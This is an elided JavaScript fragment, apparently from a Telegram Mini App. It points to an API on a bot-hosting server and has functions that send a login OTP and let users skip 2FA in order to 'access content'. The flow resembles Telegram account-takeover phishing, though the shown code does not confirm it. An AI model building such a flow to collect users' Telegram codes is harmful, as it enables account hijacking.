const API_BASE = "https://fi7.bot-hosting.net:20553";
...
async function sendOtp() {
    ...
    if (!initData) {
        showAlert("alert-phone", "Unable to verify your Telegram session. Please open this app from within Telegram.", "error");
        return;
    }
...
async function skip2fa() {
    ...
    const confirmSkip = confirm("Are you sure you want to skip 2FA verification?\n\nYou can still access content, but your account security won't be fully verified.");
